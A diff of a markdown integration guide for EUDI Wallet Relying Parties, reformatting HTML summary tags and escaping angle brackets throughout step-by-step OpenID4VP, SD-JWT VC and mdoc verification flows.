 The Status List check returns bit value `0` (VALID) for the credential's index. As discussed in §5.4.2 step 4, PID validity serves as an indirect Wallet Unit health proxy — the PID Provider is legally obligated (CIR 2024/2977 Art. 5.4(b)) to cascade-revoke PIDs when the underlying WUA is revoked. The Relying Party can therefore trust the presentation pipeline and proceed to attribute extraction.
 
@@ -5959,7 +6062,8 @@ The Status List check returns bit value `0` (VALID) for the credential's index. 
 **Artifact Produced:** Verified Credential Status boolean (VALID).
 
 </details>
-<details><summary><strong>23. Relying Party Backend extracts disclosed attributes from SD-JWT</strong></summary>
+<details>
+<summary><strong>23. Relying Party Backend extracts disclosed attributes from SD-JWT</strong></summary>
 
 The Relying Party extracts the plain-text attribute values from the SD-JWT disclosures using the hash-based matching algorithm defined in SD-JWT VC (draft-ietf-oauth-selective-disclosure-jwt §7.2):
 
@@ -5975,7 +6079,8 @@ After extraction, the Relying Party has the verified attribute map (e.g., `{"fam
 **Artifact Produced:** Extracted Plain-Text Attribute Map (e.g., JSON payload pushed to business logic).
 
 </details>
-<details><summary><strong>24. Relying Party Backend redirects Browser with authenticated session</strong></summary>
+<details>
+<summary><strong>24. Relying Party Backend redirects Browser with authenticated session</strong></summary>
 
 The Relying Party Backend creates an authenticated session (setting a secure, HttpOnly session cookie) and sends a redirect response to the User's Browser. In the same-device DC API flow, the Relying Party's `response_uri` handler returns a `redirect_uri` in the `200 OK` response body — the Wallet Unit passes this back to the Browser via the DC API, and the Browser navigates to the authenticated page.
 
@@ -5986,7 +6091,8 @@ The Relying Party should log the completed verification event for audit purposes
 **Artifact Produced:** Authenticated Session Token (Cookie / JWT).
 
 </details>
-<details><summary><strong>25. Browser renders authenticated service to User</strong></summary>
+<details>
+<summary><strong>25. Browser renders authenticated service to User</strong></summary>
 
 The User's browser navigates to the RP's authenticated area (e.g., `/dashboard`, `/account`, or `/onboarding/step-2`). The User sees the service rendered with their verified identity — their name displayed in the UI, their account created, or their age verification confirmed. The entire flow — from clicking "Verify Identity" to seeing the authenticated page — typically completes in 5–15 seconds, depending on the User's biometric authentication speed and network latency for the Status List check.
 
@@ -6063,7 +6169,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Native Relying Party App requests presentation session</strong></summary>
+<details>
+<summary><strong>1. Native Relying Party App requests presentation session</strong></summary>
 
 The Native Relying Party App signals the Relying Party Backend that a user flow requiring attributes (e.g., onboarding, authentication) has been initiated locally.
 
@@ -6086,7 +6193,8 @@ Authorization: Bearer [App_Session_Token]
 **Artifact Produced:** Authentication Session State (Pending) and App Session Token.
 
 </details>
-<details><summary><strong>2. Relying Party Backend generates JAR at request_uri</strong></summary>
+<details>
+<summary><strong>2. Relying Party Backend generates JAR at request_uri</strong></summary>
 
 Unlike a web-based Relying Party which can directly provide a QR code, the Native Relying Party App acts as a frontend client to its own Relying Party Backend. The backend takes the responsibility of securely generating the OpenID4VP JAR, storing it securely, and exposing it at a unique `request_uri`.
 
@@ -6105,7 +6213,8 @@ The Relying Party Backend creates a DCQL JSON query, injects an ephemeral P-256 
 **Artifact Produced:** Internal OpenID4VP Request mapped to `request_uri`.
 
 </details>
-<details><summary><strong>3. Relying Party Backend returns client_id and request_uri to Native App</strong></summary>
+<details>
+<summary><strong>3. Relying Party Backend returns client_id and request_uri to Native App</strong></summary>
 
 The Relying Party Backend returns the generated `client_id` (typically the `x509_hash` scheme) and the matching URL where the JAR is stored to the mobile frontend.
 
@@ -6123,7 +6232,8 @@ This strict decoupling prevents the mobile app from ever touching the backend's 
 **Artifact Produced:** Dispatched `client_id` and `request_uri` payload.
 
 </details>
-<details><summary><strong>4. Native Relying Party App invokes Universal / App Link</strong></summary>
+<details>
+<summary><strong>4. Native Relying Party App invokes Universal / App Link</strong></summary>
 
 Once the Native Relying Party App has the `client_id` and `request_uri`, it constructs the Wallet Unit's registered Application Link (e.g., `https://wallet.example.eu/present?client_id=...&request_uri=...`). It then calls the native operating system API to launch it (e.g., `UIApplication.shared.openURL()` on iOS or an Android Intent).
 
@@ -6143,7 +6253,8 @@ if let walletURL = URL(string: "https://wallet.example.eu/present?client_id=\(cl
 **Artifact Produced:** OS intent or Universal Link (App-to-App handoff).
 
 </details>
-<details><summary><strong>5. Mobile OS launches Wallet App and passes URL</strong></summary>
+<details>
+<summary><strong>5. Mobile OS launches Wallet App and passes URL</strong></summary>
 
 Because the Wallet Unit specified its `https:` scheme in its App Association files (Universal Links / Android App Links), the mobile OS guarantees security. It intercepts the HTTP invocation and launches the authenticated, installed Wallet App directly, avoiding browser-based phishing or URI hijacking risks associated with legacy custom schemes. 
 
@@ -6167,7 +6278,8 @@ The execution context is securely passed, suspending the RP App in the backgroun
 **Artifact Produced:** Activated Wallet App Session.
 
 </details>
-<details><summary><strong>6. Wallet App fetches JAR from request_uri</strong></summary>
+<details>
+<summary><strong>6. Wallet App fetches JAR from request_uri</strong></summary>
 
 The Wallet Unit reads the `request_uri` from the invocation parameters and makes an HTTP GET call to the Relying Party Backend to retrieve the full OpenID4VP payload.
 
@@ -6185,7 +6297,8 @@ User-Agent: EUDI-Wallet/1.0.0 (Android 14)
 **Artifact Produced:** Resolved `request_uri` Fetch (TLS validated).
 
 </details>
-<details><summary><strong>7. Relying Party Backend returns signed JAR</strong></summary>
+<details>
+<summary><strong>7. Relying Party Backend returns signed JAR</strong></summary>
 
 The Relying Party Backend serves the cryptographically signed JAR (including the DCQL query and ephemeral public key) back to the Wallet App.
 
@@ -6201,7 +6314,8 @@ At this stage, the Wallet possesses all cryptographic parameters necessary to au
 **Artifact Produced:** Downloaded OpenID4VP JAR (in Wallet memory).
 
 </details>
-<details><summary><strong>8. Wallet App displays consent screen to User</strong></summary>
+<details>
+<summary><strong>8. Wallet App displays consent screen to User</strong></summary>
 
 The Wallet Unit decodes the JAR, checks the requested scope against the Relying Party's registered uses, and renders a secure consent screen (showing the Relying Party name using the WRPAC).
 
@@ -6219,7 +6333,8 @@ Because the invocation arrived via an OS-level link rather than a web browser, t
 **Artifact Produced:** Rendered Wallet Consent UI.
 
 </details>
-<details><summary><strong>9. Wallet App POSTs encrypted JWE response to Relying Party</strong></summary>
+<details>
+<summary><strong>9. Wallet App POSTs encrypted JWE response to Relying Party</strong></summary>
 
 After obtaining user consent and packing the VP Token, the Wallet App submits the encrypted presentation directly to the Relying Party Backend via the `response_uri` using a background API POST.
 
@@ -6238,7 +6353,8 @@ This completes the Wallet Unit's cryptographic responsibility. The encrypted pay
 **Artifact Produced:** Encrypted Presentation payload delivered to backend (`response`).
 
 </details>
-<details><summary><strong>10. Relying Party Backend decrypts JWE and responds with HTTP 200 OK</strong></summary>
+<details>
+<summary><strong>10. Relying Party Backend decrypts JWE and responds with HTTP 200 OK</strong></summary>
 
 The Relying Party Backend decrypts the JWE, verifies the required SD-JWT and KB-JWT signatures, and confirms successful receipt of the payload. After verification, the HTTP body conditionally contains a redirect URI indicating where the Wallet Unit should route the user next.
 
@@ -6258,7 +6374,8 @@ The backend updates its internal state to mark the user's mobile app session as 
 **Artifact Produced:** Decrypted cleartext Verifiable Presentation (`vp_token`) and `redirect_uri` payload.
 
 </details>
-<details><summary><strong>11. Wallet App invokes Relying Party App Link (Inter-App Routing)</strong></summary>
+<details>
+<summary><strong>11. Wallet App invokes Relying Party App Link (Inter-App Routing)</strong></summary>
 
 After a successful POST, the Wallet App normally needs to gracefully return the user to the Relying Party application. Using the Relying Party's own predefined Universal Link (parsed from the `redirect_uri` in step 10), it asks the OS to flip context back to the Native Relying Party App, confirming completion.
 
@@ -6271,7 +6388,8 @@ UIApplication.shared.open(rpDeepLink, options: [:])
 **Artifact Produced:** Return App-to-App routing invocation.
 
 </details>
-<details><summary><strong>12. Mobile OS switches back to Native Relying Party App</strong></summary>
+<details>
+<summary><strong>12. Mobile OS switches back to Native Relying Party App</strong></summary>
 
 The OS handles the context switch back, returning control to the original calling application so the user can continue their journey.
 
@@ -6280,7 +6398,8 @@ Upon resuming foreground execution, the Native Relying Party App queries its bac
 **Artifact Produced:** Foreground Active Native Relying Party App (Authenticated).
 
 </details>
-<details><summary><strong>13. Relying Party Backend issues Silent Push Notification (Alternative Return)</strong></summary>
+<details>
+<summary><strong>13. Relying Party Backend issues Silent Push Notification (Alternative Return)</strong></summary>
 
 Alternatively, the Relying Party Backend, upon detecting a successful decoupled presentation, can leverage a real-time connection to its Native Relying Party App (e.g., WebSocket or a Silent Push Notification). 
 
@@ -6568,7 +6687,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User accesses Relying Party service on laptop browser</strong></summary>
+<details>
+<summary><strong>1. User accesses Relying Party service on laptop browser</strong></summary>
 
 The User navigates to the RP's website on a primary device (laptop, desktop, or tablet browser) and encounters a login or identity verification prompt. In the cross-device model, the User's Wallet runs on a **different** device (their smartphone) from the browsing device.
 
@@ -6585,7 +6705,8 @@ if (!window.navigator.credentials || !window.navigator.credentials.get) {
 **Artifact Produced:** Initialized Browser Application State (Waiting for QR generation).
 
 </details>
-<details><summary><strong>2. Laptop Browser sends HTTP request to Relying Party Backend</strong></summary>
+<details>
+<summary><strong>2. Laptop Browser sends HTTP request to Relying Party Backend</strong></summary>
 
 The Browser sends an AJAX or form `POST` to the Relying Party Backend (e.g., `POST /api/verify/start`) to initiate a new verification session. 
 
@@ -6607,7 +6728,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 **Artifact Produced:** Authentication Session State (Pending Waiting Context).
 
 </details>
-<details><summary><strong>3. Relying Party Backend generates session, nonce, and ephemeral ECDH keys</strong></summary>
+<details>
+<summary><strong>3. Relying Party Backend generates session, nonce, and ephemeral ECDH keys</strong></summary>
 
 The Relying Party Backend generates the cryptographic material for the session:
 
@@ -6627,7 +6749,8 @@ ephemeral_private_key = ec.generate_private_key(ec.SECP256R1())
 **Artifact Produced:** Session `nonce`, `state` bridge, and Ephemeral ECDH-ES Private/Public Key Pair (P-256).
 
 </details>
-<details><summary><strong>4. Relying Party Backend creates JAR with DCQL query</strong></summary>
+<details>
+<summary><strong>4. Relying Party Backend creates JAR with DCQL query</strong></summary>
 
 The Relying Party Backend builds a `vp_token` Request Object specifying the required claims via DCQL, signs it with its WRPAC private key to create a JWT-Secured Authorization Request (JAR), and embeds the `x509_hash` client identification alongside the ephemeral public key.
 
@@ -6679,8 +6802,8 @@ The JAR is signed as a JWS with the Relying Party's WRPAC private key. The JWS h
   "alg": "ES256",
   "typ": "oauth-authz-req+jwt",
   "x5c": [
-    "<WRPAC certificate (DER, base64)>",
-    "<Access CA intermediate certificate>"
+    "&lt;WRPAC certificate (DER, base64)>",
+    "&lt;Access CA intermediate certificate>"
   ]
 }
 ```
@@ -6688,14 +6811,16 @@ The JAR is signed as a JWS with the Relying Party's WRPAC private key. The JWS h
 **Artifact Produced:** OpenID4VP Authorization Request (Signed JAR payload).
 
 </details>
-<details><summary><strong>5. Relying Party Backend stores JAR at request_uri endpoint</strong></summary>
+<details>
+<summary><strong>5. Relying Party Backend stores JAR at request_uri endpoint</strong></summary>
 
 The Relying Party Backend caches the signed JAR in its backend (database, Redis, or in-memory store) and exposes it at a unique, short-lived endpoint: `https://verifier.example-bank.de/oid4vp/request/f47ac10b`. This `request_uri` is included in the QR code (step 6). The endpoint is single-use — after the Wallet Unit fetches the JAR (step 8), the Relying Party Backend MUST invalidate the endpoint to prevent replay. The JAR should have a short TTL (e.g., 5 minutes) to limit the window for QR code reuse.
 
 **Artifact Produced:** Published `request_uri` endpoint (Single-Use HTTP GET route).
 
 </details>
-<details><summary><strong>6. Relying Party Backend renders QR code on laptop browser</strong></summary>
+<details>
+<summary><strong>6. Relying Party Backend renders QR code on laptop browser</strong></summary>
 
 The Relying Party Backend sends the `request_uri` and connection details to the laptop browser, which renders them as a high-contrast OpenID4VP QR code on the screen. 
 
@@ -6710,7 +6835,8 @@ openid4vp://authorize?
 **Artifact Produced:** Rendered OpenID4VP QR Code (Cross-Device Invocation).
 
 </details>
-<details><summary><strong>7. User scans QR code with smartphone camera</strong></summary>
+<details>
+<summary><strong>7. User scans QR code with smartphone camera</strong></summary>
 
 The User points their smartphone camera (or the EUDI Wallet app's built-in scanner) at the QR code displayed on the laptop screen. The smartphone's OS recognises the `openid4vp://` URI scheme and launches the EUDI Wallet app. 
 
@@ -6719,7 +6845,8 @@ This physical act is the **cross-device bridge**. When the W3C Digital Credentia
 **Artifact Produced:** Decoded `request_uri` on Mobile Device.
 
 </details>
-<details><summary><strong>8. Wallet Unit POSTs to request_uri to fetch JAR</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit POSTs to request_uri to fetch JAR</strong></summary>
 
 The Wallet Unit on the smartphone initiates a direct HTTP POST connection to the Relying Party Backend using the parsed `request_uri`. For freshness and replay prevention, HAIP mandates this is executed as a POST request.
 
@@ -6738,7 +6865,8 @@ wallet_nonce=xyz789abc_dynamic_wallet_generated_value
 **Artifact Produced:** Pending `request_uri` Fetch Request (TLS validated).
 
 </details>
-<details><summary><strong>9. Relying Party Backend returns signed JAR to Wallet Unit</strong></summary>
+<details>
+<summary><strong>9. Relying Party Backend returns signed JAR to Wallet Unit</strong></summary>
 
 The Relying Party Backend dynamically binds the `wallet_nonce` to the JAR if required, and responds with the signed JWS compact serialisation (`application/oauth-authz-req+jwt`). 
 
@@ -6756,7 +6884,8 @@ When the DC API mediates the cross-device flow, the CTAP 2.2 hybrid transport es
 **Artifact Produced:** Downloaded OpenID4VP JAR (in Wallet memory).
 
 </details>
-<details><summary><strong>10. Wallet Unit verifies JAR signature against WRPAC</strong></summary>
+<details>
+<summary><strong>10. Wallet Unit verifies JAR signature against WRPAC</strong></summary>
 
 The Wallet Unit extracts the X.509 certificate chain from the JWS `x5c` header and verifies the JAR's ES256 signature using the WRPAC leaf certificate's public key. 
 
@@ -6774,7 +6903,8 @@ public_key.verify(jar_signature, jar_payload, ec.ECDSA(hashes.SHA256()))
 **Artifact Produced:** Validated WRPAC Trust Chain signature status.
 
 </details>
-<details><summary><strong>11. Wallet Unit validates WRPAC certificate chain via LoTE</strong></summary>
+<details>
+<summary><strong>11. Wallet Unit validates WRPAC certificate chain via LoTE</strong></summary>
 
 The Wallet Unit builds and validates the certificate chain: WRPAC leaf → Access CA intermediate → LoTE root trust anchor (§5.5.3). 
 
@@ -6788,7 +6918,8 @@ The Wallet Unit uniquely extracts the Relying Party's legal identity from the WR
 **Artifact Produced:** Confirmed WRPAC Origin Binding and LoTE Trust validation state.
 
 </details>
-<details><summary><strong>12. Wallet Unit evaluates disclosure policy against DCQL request</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit evaluates disclosure policy against DCQL request</strong></summary>
 
 The Wallet Unit evaluates the DCQL query against the credential's embedded disclosure policy (if any). 
 
@@ -6799,7 +6930,8 @@ Additionally, if a WRPRC is available, the Wallet cross-checks the requested cla
 **Artifact Produced:** Evaluated Disclosure Policy result map.
 
 </details>
-<details><summary><strong>13. Wallet Unit displays consent screen to User</strong></summary>
+<details>
+<summary><strong>13. Wallet Unit displays consent screen to User</strong></summary>
 
 The Wallet Unit dynamically renders the consent screen on the smartphone, showing the verified metadata. In the cross-device context, the consent screen appears on the **phone**, not the laptop — the User must actively context-switch between devices to correlate the request with their laptop activity.
 
@@ -6820,7 +6952,8 @@ The Wallet Unit dynamically renders the consent screen on the smartphone, showin
 **Artifact Produced:** Rendered Wallet Consent UI (Cross-Device Context).
 
 </details>
-<details><summary><strong>14. User approves attribute disclosure</strong></summary>
+<details>
+<summary><strong>14. User approves attribute disclosure</strong></summary>
 
 The User reviews the consent screen on their phone and explicitly taps *"Approve"* (or equivalent UI element). 
 
@@ -6834,7 +6967,8 @@ This explicit user action is the absolute foundation for GDPR compliance regardi
 **Artifact Produced:** User Disclosure Consent Granted (Boolean Map).
 
 </details>
-<details><summary><strong>15. Wallet Unit authenticates User via biometric or PIN</strong></summary>
+<details>
+<summary><strong>15. Wallet Unit authenticates User via biometric or PIN</strong></summary>
 
 The Wallet enforces LoA High user authentication by triggering the device's biometric sensor (Face ID, Android BiometricPrompt) or secure PIN entry. 
 
@@ -6843,12 +6977,13 @@ This authentication unlocks the WSCA (Wallet Secure Cryptographic Application) e
 **Artifact Produced:** Unlocked Wallet Secure Cryptographic Application (WSCA) context.
 
 </details>
-<details><summary><strong>16. Wallet Unit builds vp_token with SD-JWT VC and KB-JWT</strong></summary>
+<details>
+<summary><strong>16. Wallet Unit builds vp_token with SD-JWT VC and KB-JWT</strong></summary>
 
 The Wallet Unit constructs the response payload, selectively disclosing only the approved attributes and generating the Key Binding JWT (KB-JWT) to prove device possession.
 
 ```
-<Issuer-signed JWT>~<Disclosure:family_name>~<Disclosure:given_name>~<Disclosure:birth_date>~<KB-JWT>
+&lt;Issuer-signed JWT>~&lt;Disclosure:family_name>~&lt;Disclosure:given_name>~&lt;Disclosure:birth_date>~&lt;KB-JWT>
 ```
 
 The KB-JWT structure strongly enforces the cross-device constraints to prevent interception:
@@ -6858,7 +6993,8 @@ The KB-JWT structure strongly enforces the cross-device constraints to prevent i
 **Artifact Produced:** Key Binding JWT (KB-JWT) and Selective Disclosures (`vp_token`).
 
 </details>
-<details><summary><strong>17. Wallet Unit encrypts Verifiable Presentation into JWE</strong></summary>
+<details>
+<summary><strong>17. Wallet Unit encrypts Verifiable Presentation into JWE</strong></summary>
 
 The Wallet Unit fully encrypts the `vp_token` and state payload into a secure JSON Web Encryption (JWE) document using the Relying Party's ephemeral ECDH-ES public key (extracted from `response_encryption_jwk`).
 
@@ -6866,12 +7002,12 @@ The Wallet Unit fully encrypts the `vp_token` and state payload into a secure JS
 {
   "alg": "ECDH-ES",
   "enc": "A256GCM",
-  "kid": "<RP_ephemeral_key_thumbprint>",
+  "kid": "&lt;RP_ephemeral_key_thumbprint>",
   "epk": {
     "kty": "EC",
     "crv": "P-256",
-    "x": "<Wallet_ephemeral_X>",
-    "y": "<Wallet_ephemeral_Y>"
+    "x": "&lt;Wallet_ephemeral_X>",
+    "y": "&lt;Wallet_ephemeral_Y>"
   }
 }
 ```
@@ -6881,7 +7017,8 @@ This guarantees End-to-End Encryption (E2EE) directly between the mobile Wallet 
 **Artifact Produced:** Encrypted Verifiable Presentation (JWE string).
 
 </details>
-<details><summary><strong>18. Wallet Unit POSTs encrypted response to Relying Party response_uri</strong></summary>
+<details>
+<summary><strong>18. Wallet Unit POSTs encrypted response to Relying Party response_uri</strong></summary>
 
 The Wallet Unit safely transfers the encrypted JWE response directly across the internet to the Relying Party's backend `response_uri`.
 
@@ -6898,13 +7035,14 @@ response=eyJhbGciOiJFQ0RIL...[Encrypted_Data]&state=xd-session-9f2a
 **Artifact Produced:** Encrypted Presentation payload delivered to backend (`response`).
 
 </details>
-<details><summary><strong>19. Relying Party Backend decrypts JWE response</strong></summary>
+<details>
+<summary><strong>19. Relying Party Backend decrypts JWE response</strong></summary>
 
 The Relying Party Backend retrieves the previously stored ephemeral private key (matching the `state`), decrypts the JWE, and instantly destroys the private key to uphold forward secrecy.
 
 ```json
 {
-  "vp_token": "<SD-JWT VC string as above>",
+  "vp_token": "&lt;SD-JWT VC string as above>",
   "presentation_submission": {
     "id": "submission-1",
     "definition_id": "dcql-query-1",
@@ -6925,7 +7063,8 @@ The Relying Party Backend retrieves the previously stored ephemeral private key 
 **Artifact Produced:** Decrypted cleartext Verifiable Presentation (`vp_token` string).
 
 </details>
-<details><summary><strong>20. Relying Party Backend verifies SD-JWT and KB-JWT signatures</strong></summary>
+<details>
+<summary><strong>20. Relying Party Backend verifies SD-JWT and KB-JWT signatures</strong></summary>
 
 The Relying Party Backend runs the full SD-JWT VC verification pipeline (§5.4.2): 
 1. Verify the Issuer-JWT ES256 signature against the PID Provider's LoTE trust anchor.
@@ -6947,7 +7086,8 @@ def validate_kb_jwt(kb_jwt, expected_nonce, expected_aud):
 **Artifact Produced:** Validated Subject Attributes, Issuer Signature, and Device Binding state.
 
 </details>
-<details><summary><strong>21. Relying Party Backend checks credential revocation via Status List</strong></summary>
+<details>
+<summary><strong>21. Relying Party Backend checks credential revocation via Status List</strong></summary>
 
 The Relying Party Backend queries the PID Provider's Status List using the encoded status index to see if the credential has been revoked or suspended.
 
@@ -6962,7 +7102,8 @@ The Relying Party Backend decompresses the `lst` field (DEFLATE) and checks the 
 **Artifact Produced:** Fetched Status List Token JWT.
 
 </details>
-<details><summary><strong>22. Status List confirms credential validity to Relying Party Backend</strong></summary>
+<details>
+<summary><strong>22. Status List confirms credential validity to Relying Party Backend</strong></summary>
 
 The Status List bit-array logically returns a bit value `0` (VALID) at the credential's exact index. 
 
@@ -6973,7 +7114,8 @@ The Relying Party Backend now has mathematically proven cryptographic confidence
 **Artifact Produced:** Verified Credential Status boolean (VALID).
 
 </details>
-<details><summary><strong>23. Relying Party Backend extracts disclosed attributes from SD-JWT</strong></summary>
+<details>
+<summary><strong>23. Relying Party Backend extracts disclosed attributes from SD-JWT</strong></summary>
 
 The Relying Party Backend safely extracts the verified plain-text attribute values from the SD-JWT disclosures and logically maps them into the active user session context.
 
@@ -6997,7 +7139,8 @@ Only explicitly disclosed attributes are available. The Relying Party mathematic
 **Artifact Produced:** Extracted Plain-Text Attribute Map (e.g., JSON payload pushed to business logic).
 
 </details>
-<details><summary><strong>24. Relying Party Backend binds verified attributes to laptop session via state</strong></summary>
+<details>
+<summary><strong>24. Relying Party Backend binds verified attributes to laptop session via state</strong></summary>
 
 The Relying Party Backend leverages the `state` parameter (`xd-session-9f2a`) extracted from the decrypted Wallet Unit response to execute a rapid look-up in its session database (e.g., Redis). 
 
@@ -7006,7 +7149,8 @@ It dynamically merges the verified attribute data into the waiting laptop browse
 **Artifact Produced:** Bound Authentication Session Context (Laptop ↔ Phone).
 
 </details>
-<details><summary><strong>25. Relying Party Backend pushes session update to laptop browser</strong></summary>
+<details>
+<summary><strong>25. Relying Party Backend pushes session update to laptop browser</strong></summary>
 
 The Relying Party Backend actively signals the constantly-polling laptop browser that the cross-device authentication flow has successfully concluded. 
 
@@ -7026,7 +7170,8 @@ data: {"redirect_url": "/dashboard/welcome"}
 **Artifact Produced:** Dispatched Authenticated Session Event (SSE/WebSocket).
 
 </details>
-<details><summary><strong>26. Laptop Browser renders authenticated service to User</strong></summary>
+<details>
+<summary><strong>26. Laptop Browser renders authenticated service to User</strong></summary>
 
 Upon detecting the successful session update push, the laptop browser systematically drops the QR code polling screen and immediately redirects to the target secure area (e.g., the user dashboard, a protected document, or stage 2 of onboarding).
 
@@ -7448,11 +7593,11 @@ A critical resiliency challenge for RPs is managing orphaned sessions, particula
 ```mermaid
 flowchart LR
     SD("`📱 **Same-device attempt**
-    <small>W3C DC API</small>`")
+    &lt;small>W3C DC API&lt;/small>`")
     CD("`💻 ↔️ 📱 **Cross-device fallback**
-    <small>QR Code + BLE</small>`")
+    &lt;small>QR Code + BLE&lt;/small>`")
     MV("`🧑‍💼 **Manual verification**
-    <small>Document upload / In-person</small>`")
+    &lt;small>Document upload / In-person&lt;/small>`")
 
     SD -- "fails ❌" --> CD
     CD -- "fails ❌" --> MV
@@ -7981,7 +8126,7 @@ LPID Providers are national business registers, not the civil registries that is
 After verifying the LPID credential's signature and trust chain, the RP should validate the `legal_person_id` claim format (§3.4):
 
 ```
-Pattern: <CountryCode><BusinessRegisterCode>.<DomesticRegistrationNumber>[_<ValidationChar>]
+Pattern: &lt;CountryCode>&lt;BusinessRegisterCode>.&lt;DomesticRegistrationNumber>[_&lt;ValidationChar>]
 Regex:   ^[A-Z]{2}[A-Z0-9]+\.[A-Z0-9]+(_[A-Z0-9])?$
 ```
 
@@ -8088,7 +8233,7 @@ When the RP requests `response_mode=direct_post.jwt` (JARM — JWT Secured Autho
 ```mermaid
 flowchart TD
     A["`**1.&nbsp;HTTP&nbsp;POST&nbsp;Payload**
-    Form&nbsp;urlencoded&nbsp;string:&nbsp;response=<JWE>`"]
+    Form&nbsp;urlencoded&nbsp;string:&nbsp;response=&lt;JWE>`"]
     B["`**2.&nbsp;Transport&nbsp;Decryption&nbsp;(JWE)**
     Decrypt&nbsp;using&nbsp;RP's&nbsp;ephemeral&nbsp;private&nbsp;key`"]
     C["`**3.&nbsp;Authorisation&nbsp;Response&nbsp;Verification&nbsp;(JWS)**
@@ -8106,7 +8251,7 @@ flowchart TD
 
 The unwrapping process follows a strict sequence:
 
-1. **Transport Decryption (JWE)**: The HTTP POST payload is a form-urlencoded string: `response=<JWE>`. The RP decrypts this JWE using the private key corresponding to the ephemeral public key (`response_encryption_jwk`) it generated and sent in the presentation request JAR.
+1. **Transport Decryption (JWE)**: The HTTP POST payload is a form-urlencoded string: `response=&lt;JWE>`. The RP decrypts this JWE using the private key corresponding to the ephemeral public key (`response_encryption_jwk`) it generated and sent in the presentation request JAR.
    - **Algorithm**: Typically `ECDH-ES` with `A256GCM` (or `X25519`).
    - **Output**: A decrypted JWS.
 2. **Authorisation Response Verification (JWS)**: The decrypted payload is a JWS. The RP must verify this signature to ensure the response originated from the target Wallet Unit and hasn't been tampered with.
@@ -8117,12 +8262,12 @@ The unwrapping process follows a strict sequence:
 
 #### 12.2 SD-JWT VC Parsing and Validation Logic
 
-The SD-JWT VC format introduces selective disclosure via a pre-computed recursive hash-chain mechanism. The `vp_token` string is constructed as a tilde-separated (`~`) list of components: `<Issuer_JWT>~<Disclosure_1>~...~<Disclosure_N>~<KB_JWT>`.
+The SD-JWT VC format introduces selective disclosure via a pre-computed recursive hash-chain mechanism. The `vp_token` string is constructed as a tilde-separated (`~`) list of components: `&lt;Issuer_JWT>~&lt;Disclosure_1>~...~&lt;Disclosure_N>~&lt;KB_JWT>`.
 
 ```mermaid
 flowchart TD
     VP["`**vp_token&nbsp;Input&nbsp;String**
-    <Issuer_JWT>~<Disclosure_1>~...~<KB_JWT>`"]
+    &lt;Issuer_JWT>~&lt;Disclosure_1>~...~&lt;KB_JWT>`"]
 
     subgraph Split["`**Phase&nbsp;1:&nbsp;Parsing&nbsp;&&nbsp;Splitting**`"]
         direction LR
@@ -8167,12 +8312,12 @@ flowchart TD
 
 **Phase 3: Disclosure Array Hashing (Bit-Level)**
 For every disclosure string in the input sequence, the RP must independently verify its cryptographic integrity to guarantee the Wallet hasn't fabricated attributes:
-1. Base64url-decode the disclosure string. The result is a JSON array: `[<salt>, <claim_name>, <claim_value>]`.
-2. **Critical Step**: Re-encode the *identical* Base64url disclosure string. Do not use the parsed JSON to regenerate the string, as whitespace and structural variances will corrupt the hash. Use the raw `<Disclosure>` string as it was received.
+1. Base64url-decode the disclosure string. The result is a JSON array: `[&lt;salt>, &lt;claim_name>, &lt;claim_value>]`.
+2. **Critical Step**: Re-encode the *identical* Base64url disclosure string. Do not use the parsed JSON to regenerate the string, as whitespace and structural variances will corrupt the hash. Use the raw `&lt;Disclosure>` string as it was received.
 3. Compute the hash of the raw disclosure string using the algorithm specified in `_sd_alg` (e.g., `SHA-256("wyz...abc")`).
 4. Base64url-encode the resulting byte array.
 5. Search for this exact encoded hash within the `_sd` array of the Issuer JWT (or within nested object `_sd` arrays if applicable).
-   - *If the hash is found*: The claim is cryptographically authentic. Insert the `<claim_name>` and `<claim_value>` into the verified identity dataset.
+   - *If the hash is found*: The claim is cryptographically authentic. Insert the `&lt;claim_name>` and `&lt;claim_value>` into the verified identity dataset.
    - *If the hash is missing*: The disclosure is fabricated or tampered with. Reject the presentation immediately.
 
 **Phase 4: Key Binding JWT (KB-JWT) Validation**
@@ -8183,7 +8328,7 @@ The final element in the tilde-separated string is the Key Binding JWT, which pr
 4. **Payload Validation**:
    - `aud`: Must perfectly match the RP's identifying URI (or `client_id`).
    - `nonce`: Must perfectly match the nonce the RP provided in its request JAR.
-   - `sd_hash`: Must be the `SHA-256` hash of the entire SD-JWT string *excluding* the trailing `~<KB-JWT>` suffix. This proves the KB-JWT signature is bound to this specific subset of disclosures.
+   - `sd_hash`: Must be the `SHA-256` hash of the entire SD-JWT string *excluding* the trailing `~&lt;KB-JWT>` suffix. This proves the KB-JWT signature is bound to this specific subset of disclosures.
 
 #### 12.3 mdoc (ISO 18013-5) CBOR Parsing: MAC vs. Signature
 
@@ -8262,9 +8407,9 @@ The proximity protocol uses three physical transport layers:
 
 | Transport | Range | Typical Use Case |
 |:----------|:------|:-----------------|
-| **NFC** | < 10 cm | Initial device engagement (tap-to-share) |
-| **BLE** | < 30 m | Data transfer after engagement |
-| **Wi-Fi Aware** | < 50 m | High-bandwidth data transfer |
+| **NFC** | &lt; 10 cm | Initial device engagement (tap-to-share) |
+| **BLE** | &lt; 30 m | Data transfer after engagement |
+| **Wi-Fi Aware** | &lt; 50 m | High-bandwidth data transfer |
 
 The protocol proceeds in four phases: Device Engagement → Session Establishment → Data Retrieval → Session Termination.
 
@@ -8354,7 +8499,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Agent requests credential presentation from User</strong></summary>
+<details>
+<summary><strong>1. RP Agent requests credential presentation from User</strong></summary>
 
 The RP Agent (e.g., a bank teller, border guard, or hotel receptionist) verbally requests the User to present their digital credentials. In supervised flows, the human interaction is a critical trust component — the Agent is performing **visual identity binding** (steps 21–23) that cannot be replicated in unsupervised flows (§13.10). The Agent may specify which credential is needed: *"Please show me your EUDI Wallet identity"* (PID) or *"Can I see your digital driving licence?"* (mDL).
 
@@ -8363,14 +8509,16 @@ The RP Agent (e.g., a bank teller, border guard, or hotel receptionist) verbally
 **Audit Telemetry:** The Relying Party (via the mdoc Reader terminal) logs a `SUPERVISED_VERIFICATION_INITIATED` event.
 
 </details>
-<details><summary><strong>2. User opens Wallet Unit and selects credential</strong></summary>
+<details>
+<summary><strong>2. User opens Wallet Unit and selects credential</strong></summary>
 
